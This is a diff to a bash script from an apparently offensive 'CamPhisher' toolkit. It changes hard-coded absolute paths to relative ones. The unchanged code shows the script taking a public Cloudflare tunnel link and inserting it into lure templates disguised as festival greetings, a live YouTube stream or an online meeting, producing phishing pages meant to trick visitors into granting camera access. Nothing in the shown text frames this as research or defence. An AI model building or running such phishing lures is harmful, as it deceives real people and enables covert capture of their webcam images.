@@ -1,5 +1,7 @@
 #!/bin/bash
 
+cd .files/.phishing/L0p4-CamPhisher
+
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
   windows_mode=true
   echo "Windows system detected. Some commands will be adapted for Windows compatibility."
@@ -267,17 +269,17 @@ checkfound
 
 payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-sed 's+forwarding_link+'$link'+g' /media/l0p4/0ac48464-eb52-4bb1-b125-727cdf0ba109/backup/L0p4-Toolkit/.files/.phishing/L0p4-CamPhisher/template.php > index.php
+sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' /media/l0p4/0ac48464-eb52-4bb1-b125-727cdf0ba109/backup/L0p4-Toolkit/.files/.phishing/L0p4-CamPhisher/festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' /media/l0p4/0ac48464-eb52-4bb1-b125-727cdf0ba109/backup/L0p4-Toolkit/.files/.phishing/L0p4-CamPhisher/LiveYTTV.html > index3.html
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' /media/l0p4/0ac48464-eb52-4bb1-b125-727cdf0ba109/backup/L0p4-Toolkit/.files/.phishing/L0p4-CamPhisher/OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
 fi
-rm -rf /media/l0p4/0ac48464-eb52-4bb1-b125-727cdf0ba109/backup/L0p4-Toolkit/.files/.phishing/L0p4-CamPhisher/index3.html
+rm -rf index3.html
 }
 
 ngrok_server() {
